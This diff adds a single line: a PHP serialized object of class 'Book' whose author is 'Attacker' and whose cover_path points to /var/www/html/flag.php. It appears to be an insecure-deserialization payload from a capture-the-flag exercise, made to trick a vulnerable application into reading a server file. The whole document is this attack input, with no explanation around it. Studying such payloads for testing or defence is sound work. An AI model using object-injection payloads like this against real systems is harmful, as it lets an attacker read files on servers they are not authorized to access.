@@ -1,0 +1,1 @@
+O:4:"Book":4:{s:5:"title";s:14:"Exploited Book";s:6:"author";s:8:"Attacker";s:10:"cover_path";s:22:"/var/www/html/flag.php";s:11:"cover_image";N;}
